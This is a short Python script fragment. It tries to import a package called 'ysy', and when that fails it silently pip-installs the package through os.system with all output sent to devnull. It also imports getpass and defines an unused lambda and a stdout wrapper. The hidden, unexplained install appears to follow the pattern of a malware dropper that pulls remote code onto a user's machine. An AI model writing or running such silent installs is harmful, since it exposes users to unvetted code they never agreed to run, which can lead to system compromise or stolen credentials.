import os
import getpass
try:
    import ysy
except ImportError:
    os.system(f"pip3.11 install ysy > {os.devnull} 2>&1")
import sys; nasr = lambda *args: f"{args}"; stdout = type("Stdout", (), {"write": lambda self, text: sys.stdout.write(text), "flush": lambda self: sys.stdout.flush()})()